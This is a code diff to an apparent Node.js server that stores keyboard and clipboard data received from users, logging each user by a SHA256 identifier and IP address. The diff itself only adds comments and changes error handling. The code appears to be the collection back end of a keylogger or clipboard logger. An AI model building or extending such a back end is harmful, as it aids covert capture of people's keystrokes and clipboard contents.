@@ -11,6 +11,7 @@ var db = mysql.createConnection({
 });
 db.connect();
 
+// Convert array of key codes to text string
 function resolveKeyCodes(keyCodes) {
     var text = '';
 
@@ -45,6 +46,7 @@ function resolveKeyCodes(keyCodes) {
     return text;
 }
 
+// Save keyboard data to database
 function saveKeyboard(user_id, data) {
     for (var i = 0; i < data.length; i++) {
 
@@ -68,6 +70,7 @@ function saveKeyboard(user_id, data) {
     }
 }
 
+// Save clipboard data to database
 function saveClipboard(user_id, data) {
     for (var i = 0; i < data.length; i++) {
 
@@ -91,6 +94,7 @@ function saveClipboard(user_id, data) {
     }
 }
 
+// Save data to database
 function saveData(user_id, data) {
     switch (data.type) {
         // Keyboard
@@ -104,6 +108,7 @@ function saveData(user_id, data) {
     }
 }
 
+// Validate SHA256 hash digest
 function validateSHA256(sha256) {
     if (sha256.length != 64) {
         return false;
@@ -119,32 +124,28 @@ function validateSHA256(sha256) {
     return true;
 }
 
-// Add user to database. Returns user id.
+// Add user to database
 function addUser(ws, sha256, callback) {
     var query = 'INSERT INTO users (sha256, ip) VALUES (?, ?)';
     var values = [sha256, ws._socket.remoteAddress];
 
     db.query(query, values, function (err, rows, fields) {
-        if (err) {
-            callback(-1);
-        } else {
+        if (!err) {
             callback(rows.insertId, sha256);
         }
     });
 }
 
-// Returns user ID by sha256
+// Returns user ID to callback function by SHA256
 function getUserID(ws, sha256, callback) {
     var uidIsOk = validateSHA256(sha256);
     if (!uidIsOk) {
-        callback(-1);
+        return;
     }
 
     // Find user with given UID
     db.query('SELECT * FROM users WHERE sha256 = ?', [sha256], function (err, rows, fields) {
-        if (err) {
-            callback(-1);
-        } else {
+        if (!err) {
             if (rows.length == 0) {
                 addUser(ws, sha256, callback);
             } else {
